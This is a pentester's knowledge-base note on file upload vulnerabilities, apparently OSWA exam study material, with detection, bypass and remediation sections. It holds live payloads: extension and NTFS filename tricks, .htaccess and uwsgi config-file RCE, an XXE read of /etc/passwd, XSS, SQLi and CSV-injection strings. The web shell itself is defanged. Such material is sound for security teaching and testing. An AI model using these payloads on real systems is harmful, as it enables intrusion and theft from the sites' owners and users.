---
type: technique
title: File upload vulnerabilities
lang: en
status: active
wstg: ["WSTG-BUSL-09", "WSTG-BUSL-08"]
owasp_top10: ["A03:2021"]
owasp_api: []
asvs: ["V5.2.2", "V5.3.1", "V5.3.3"]
cwe: ["CWE-434"]
attack: ["T1190"]
cvss: ""
sources: [web-200-oswa, colleague-web-wiki, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# File upload vulnerabilities

**TL;DR** — An upload feature that fails to constrain the file's **type, name, content, or
storage location** lets an attacker plant an executable (a web shell → RCE), poison the
parser (XXE/SSRF), or write outside the intended directory. The highest-value outcome on an
[[oswa-exam|OSWA]] box is a web shell in an executable path.

> Framework: **A03:2021 – Injection**, `CWE-434` (Unrestricted Upload of File with Dangerous
> Type), ATT&CK `T1190`. WSTG `WSTG-BUSL-09` (malicious files) / `WSTG-BUSL-08` (unexpected
> types).
> ⚠️ **AV/OneDrive note:** the web-shell body is **defanged** (placeholder). Reconstruct the
> live one-liner at test time; keep it off this synced vault.

## Where it applies

Avatar/profile pictures, document/attachment uploads, import features (CSV/XML/ZIP), image
processing, "upload your CV", theme/plugin installers. The two questions that decide impact:
**can I control the stored file's extension/content**, and **where does the file land (and is
that path executable)?**

## How it works

Server-side code that executes files by extension (PHP/JSP/ASPX in the web root) will run any
script you get written there. Defences are layered — client-side JS check, `Content-Type`
check, extension denylist/allowlist, magic-byte check, image re-encoding — and each layer has
bypasses.

## Detecting & mapping

1. Upload a benign file, capture the request in [[burp-suite|Burp]]; note the field name,
   `Content-Type`, and any client-side validation (bypass it by editing the request in Burp —
   client checks are cosmetic).
2. Find the **storage path**: the response, the rendered `<img src>`, a predictable
   `/uploads/<name>`, or content discovery ([[ffuf]]). No reachable/executable path → no RCE
   (but XSS/XXE/traversal may still apply).
3. Probe what the server enforces: change extension, `Content-Type`, and bytes one at a time.

## Bypass library (payloads)

```text
# 1. Client-side only  → intercept in Burp, send shell.php with the JS check skipped.

# 2. Content-Type spoof → keep name shell.php, set header:
Content-Type: image/jpeg

# 3. Extension allow/deny bypass (PHP handlers vary by config):
shell.phtml  shell.php5  shell.php7  shell.phar  shell.pht  shell.phps  shell.inc
shell.PhP    shell.pHp                                  # case (case-insensitive FS/handler)
# JSP: .jsp .jspx .jsw .jsv .jspf   |  ASP: .asp .aspx .asa .cer .cshtml

# 4. Double / trailing tricks:
shell.jpg.php            # double extension (last one wins on Apache)
shell.php.jpg            # + Apache "AddHandler"/multi-ext mis-config runs it as PHP
shell.php%00.jpg         # null byte (old PHP) truncates to shell.php
shell.php;.jpg           # IIS legacy
shell.php%20  shell.php.  shell.php::$DATA   # trailing space/dot/ADS (Windows) stripped on save

# 5. Magic-byte / polyglot: prepend real image bytes, keep PHP after:
GIF89a;<?php /* $_GET['c'] -> exec (reconstruct) */ ?>   # passes getimagesize()-style checks

# 6. Path traversal in the FILENAME → choose where it lands:
filename="../../../../var/www/html/shell.php"

# 7. .htaccess trick (no direct .php allowed): upload an .htaccess that maps a benign ext to PHP:
#   AddType application/x-httpd-php .jpg    → then upload shell.jpg
```

## Getting a shell (defanged)

A minimal PHP command web shell — **defanged on purpose**:
```php
<?php /* upload web shell: read $_REQUEST['c'] -> command-exec function -> echo output (reconstruct) */ ?>
```
Once written to an executable path, browse to it with `?c=id` to confirm, then upgrade to a
reverse shell (one-liners on [[command-injection]]) and catch with [[netcat]].

## Non-RCE impact (still findings)

- **SVG / HTML upload → [[xss|stored XSS]]** (SVG can carry `<script>`); serve-inline apps are
  worst.
- **XML upload → [[xxe]]** (DOCX/SVG/XML parsers).
- **Zip Slip** — an archive whose entries traverse (`../../../shell.php`) writes outside the
  extract dir; **archive symlink** to `/etc/passwd`; **zip bomb** (DoS — get written approval).
- **Image parser exploits**, **CSV injection**, PDF-embedded JavaScript.
- Test malware handling with the inert **EICAR** string, not real malware.

## More bypasses & config-file RCE

Fuller set: [[payloadsallthethings|PaTT]] + [[hacktricks]]. Web-shell bodies stay defanged.

**Alt executable extensions by stack** (one blocked → try siblings):

```text
PHP:  .php .php3 .php4 .php5 .php7 .pht .phtml .phar .inc
ASP:  .asp .aspx .asa .cer .cshtml .config       JSP:  .jsp .jspx .jsw .jsv .jspf
```

**NTFS / Windows filename tricks:**

```text
shell.aspx:.jpg        # ADS: forbidden ext hidden before ":"
shell.asp::$DATA       # ::$DATA stream writes the real content
shell.php...           # trailing dots/spaces stripped on save → shell.php
```

**Config-file RCE** — upload a config that makes the server run your files:

```apache
# .htaccess (Apache) — map an arbitrary ext to the PHP handler, then upload x.rce
AddType application/x-httpd-php .rce
```
```ini
# uwsgi.ini — @(exec://) fires on parse/reload
[uwsgi]
body = @(exec://whoami)
```
```json
// package.json / composer.json — a lifecycle script runs on install
"scripts": { "prepare": "/bin/touch /tmp/pwned" }
```
Also: IIS `web.config` with a `scriptProcessor` mapping; a Python `.pth` dropped into
site-packages (runs at interpreter startup).

**Path-in-filename & second-order** (the bug is in *handling*, not the upload):

```text
../../../var/www/html/shell.php                      # write outside the upload dir (Zip Slip in archives)
image.png../../../../etc/passwd                      # traversal via the filename
'"><img src=x onerror=alert(document.domain)>.png    # stored XSS via the filename
poc'(select(sleep(10)))'.png                         # 2nd-order SQLi via the filename
```
Race condition: upload `shell.php`, then include/run it via [[lfi]] before the server deletes it.

**Non-RCE via file content:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>            <!-- stored XSS -->
<?xml version="1.0"?><!DOCTYPE t [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>  <!-- XXE -->
```
Zip Slip (`../` in an archive entry), CSV/formula injection (`=cmd|'/c calc'!A1`), and
decompression/pixel bombs (DoS — get approval).

**Image-processor CVEs** (upload as an image; the backend converter runs it):

- **ImageTragick** (CVE-2016-3714) — MVG/MSL with a `url(...)` that shells out.
- **CVE-2022-44268** (ImageMagick) — a PNG whose `profile` chunk names `/etc/passwd`; read it
  back from `identify -verbose` output.

## Worked example — avatar upload, double-ext + magic-byte

A profile page accepts `avatar` and validates "is it an image?" by `Content-Type` and a
`getimagesize()` check, storing to `/uploads/<name>`.

1. Upload `shell.php` → rejected ("not an image").
2. Rename to `shell.php.jpg`, set `Content-Type: image/jpeg`, and prepend `GIF89a;` before the
   (defanged) PHP → passes both checks; stored as `/uploads/shell.php.jpg`.
3. It doesn't execute as `.jpg`. Retry as `shell.jpg.php` (last extension wins) with the same
   magic bytes → stored as `/uploads/shell.jpg.php`.
4. Browse `/uploads/shell.jpg.php?c=id` → `uid=33(www-data)` → RCE. Reverse shell → foothold.

## Tooling

[[burp-suite|Burp]] Repeater to iterate one variable at a time; [[ffuf]] to find the upload
directory and brute stored filenames; [[curl]] to reproduce. Fuzz extensions with the SecLists
`Fuzzing/extensions` lists.

## Confirming impact

Prove code execution (`id`/`whoami` from the uploaded shell) or the concrete non-RCE impact
(stored XSS firing, file written outside the intended dir). Severity **Critical** for RCE.

## Remediation

- Validate type by **content** (magic bytes) *and* an **allowlist** of extensions; never trust
  `Content-Type` or the client.
- Store uploads **outside the web root** or on a domain that serves them as attachments with a
  non-executable handler; generate a random server-side filename (drop the user's name/ext).
- Re-encode images; scan with anti-malware; handle archives safely (reject traversal/symlinks,
  cap decompression). Cross-check the [[colleague-web-wiki|file-upload-security]] control notes.

## Pitfalls / evasion

- The app may store the file but under a **non-executable** path — hunt for a second sink
  (LFI include of your upload via [[lfi]] `zip://`/`phar://`) instead of giving up.
- Re-encoding defeats polyglots → pivot to SVG-XSS / XXE / metadata (`exiftool`-planted PHP in
  a comment segment, then LFI-include it).

## Quick checklist

- [ ] Can I control extension / content / magic bytes — and where does the file land (executable path)?
- [ ] Blocked ext → alt/double ext, case, null-trailing, ADS; type check → Content-Type + magic bytes / polyglot.
- [ ] No code ext allowed → **config-file RCE** (.htaccess/web.config/uwsgi/.pth) or upload + [[lfi]] include.
- [ ] Not an executable path → SVG-XSS / XXE / Zip Slip / CSV / traversal-in-filename / image-CVE.
- [ ] Confirm `id` from the shell (defanged); note where it landed.

## See also

[[command-injection]] · [[lfi]] · [[xxe]] · [[xss]] · [[burp-suite]] · [[oswa-exam]]

*Sources: [[web-200-oswa]] (upload abuse across case studies); [[colleague-web-wiki]] (WSTG-BUSL-08/09 evasion list); [[payloadsallthethings]] + [[hacktricks]] (config-file RCE, ADS, second-order, image-processor CVEs).*
